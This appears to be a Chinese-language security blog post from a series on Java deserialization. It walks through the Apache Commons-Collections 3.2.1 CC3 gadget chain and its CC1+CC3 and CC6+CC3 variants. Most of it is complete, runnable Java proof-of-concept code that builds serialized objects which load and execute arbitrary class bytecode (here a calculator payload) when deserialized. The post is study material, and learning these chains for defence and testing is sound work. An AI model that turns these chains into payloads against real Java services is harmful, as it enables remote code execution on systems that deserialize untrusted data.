---
title: Commons-Collections篇04-CC3链
date: 2025-9-26 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 环境搭建

- jdk8u65
- Commons-Collections 3.2.1

# Templatelmpl动态加载字节码

这个在`文章类加载器`中也有讲

# 后半部分调用链

## CC3链分析：

在`Templatelmpl`动态加载字节码中我们知道，通过`Templateslmpl.newTransformer()`方法就可以命令执行

所以这里就要哪里找调用了`newTransformer()`方法

`TrAXFilter`的构造函数中调用了`newTransformer()`方法

![image-20250927170246923](./Commons-Collections%E7%AF%8704-CC3%E9%93%BE/image-20250927200457335.png)

下一步用的是`InstantiateTransformer`下的`transform()`方法

这个`transform()`方法，输入的`input`对象非空就会跳转到`else`中，`else`中通过反射拿到了`input`对象的构造方法，并且将构造方法实例化进行返回

所以这里我们可以将`TrAXFilter`传入，就会运行`TrAXFilter`的构造方法，进而运行`newTransformer()`

![image-20250927200712367](./Commons-Collections%E7%AF%8704-CC3%E9%93%BE/image-20250927200712367.png)

## 调用链

![image-20250927170246923](./Commons-Collections%E7%AF%8704-CC3%E9%93%BE/image-20250927170246923.png)

## 代码实现

利用有参构造实例化`InstantiateTransformer`，参数分别是`TrAXFilter`构造函数的`参数类型`和`参数值`

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class CC3 {
    public static void main(String[] args) throws Exception {
        
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//上面这一部分就是Templatelmpl动态加载字节码的代码
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);

    }
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
     }
}

```

# CC1+CC3

接下来就是要怎么调用`transform()`方法，那就回到了`CC1`链

CC1链是第一个学习的，可能当时还有点蒙，现在到CC3了可以字节一步一步再推回去，自己再写一遍，顺便也可以再次学习一下`CC1`链

## 调用链

![image-20250927201330228](./Commons-Collections%E7%AF%8704-CC3%E9%93%BE/image-20250927201330228.png)

## 逐步向前推进

### TransformedMap.checkSetValue()调用transform()

只给出了其中需要添加修改的代码，具体原理截图看CC1链中的内容

通过`decorate`方法给`valueTransformer`赋值，然后通过反射调用`checkSetValue`方法

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        HashMap hashMap = new HashMap();
        Map decoratemap = TransformedMap.decorate(hashMap,null,instantiateTransformer);
        Class  transformedmapclass =TransformedMap.class;
        Method checksetvalue = transformedmapclass.getDeclaredMethod("checkSetValue", Object.class);
        checksetvalue.setAccessible(true);
        checksetvalue.invoke(decoratemap,TrAXFilter.class);
```

### AbstractInputCheckedMapDecorator.setValue()方法调用checkSetValue()

通过给键值对赋值来调用setValue()方法

```java
                byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        HashMap hashMap = new HashMap();
        hashMap.put("value","aaa");
        Map<Object,Object> decoratemap = TransformedMap.decorate(hashMap,null,instantiateTransformer);
        for (Map.Entry entry : decoratemap.entrySet()) {
            entry.setValue(TrAXFilter.class);
        }
```

## 完整代码

加载的字节码是可以序列化的，但是由于`setValue`参数的不可控，所以还是必须要用`ChainedTransformer`来控制参数

具体原因可以看[CC1链](http://www.liam317.top/2025/09/22/Commons-Collections%E7%AF%8701-CC1%E9%93%BE/)中遇到的问题

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {
         byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
         TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", new Class[0], new Object[0])
        };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("value","aaa");
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap,null,chainedTransformer);


        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorateMap);
        serialize(o);
        unserialize("test.txt");

        }


    public static void serialize(Object object) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.txt"));
        oos.writeObject(object);
    }
    public static void unserialize(Object object) throws Exception{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream("test.txt"));
        ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
 }
}

```

# CC6+CC3

前面文章复现CC6链时用的是`jdk-8u71`，用这个jdk复现CC6+CC3时会各种报错，CC6链不受JDK版本限制，所以将JDK版本降到`jdk-8u65`就可以完美复现

## 调用链

![image-20250927204841244](./Commons-Collections%E7%AF%8704-CC3%E9%93%BE/image-20250927204841244.png)

## 完整代码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class CC6_CC3 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_name", "Calc");
         setFieldValue(templates, "_bytecodes", new byte[][] {code});
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",new Class[0],new Object[0])

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashmap = new HashMap<>();
        LazyMap decoratemap = (LazyMap)LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");

//        hashmap.put(tiedMapEntry,decoratemap);
        Field mapfield = tiedMapEntry.getClass().getDeclaredField("map");
        mapfield.setAccessible(true);
        mapfield.set(tiedMapEntry,new HashMap());
        hashmap.put(tiedMapEntry,"value");
        mapfield.set(tiedMapEntry,decoratemap);
          serialize(hashmap);
          unserialize("test.txt");


    }
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.txt"));
        oos.writeObject(obj);
    }
    public static void unserialize(Object obj) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("test.txt"));
        ois.readObject();
    }
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}


```

